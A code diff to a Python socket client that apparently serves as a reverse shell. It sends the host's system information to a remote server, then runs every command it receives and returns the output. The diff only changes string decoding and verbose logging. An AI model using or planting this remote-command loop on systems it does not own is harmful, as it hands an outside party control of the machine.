@@ -64,17 +64,14 @@ class Client(StreamSocket):
             utils.throw(f"Could not establish connection with {self.Address}")
 
         try:
-            establish_msg = self.receive(sock)
+            establish_msg = self.receive(sock).decode()
             utils.status(establish_msg)
 
             sysinfo = self.sys_info()
             self.send(sock, sysinfo)
 
             while True:
-                command = self.receive(sock)
-
-                if self.Verbose:
-                    utils.status(command)
+                command = self.receive(sock).decode()
 
                 if command.lower() in ["exit", "quit"]:
                     self.send(sock, "Connection will now terminate")
@@ -84,7 +81,7 @@ class Client(StreamSocket):
                 output, level = self.execute(command, executable)
 
                 if self.Verbose:
-                    utils.status(output.decode(), level)
+                    utils.status(output.decode(), level, command)
 
                 self.send(sock, output)
         except Exception as exc:
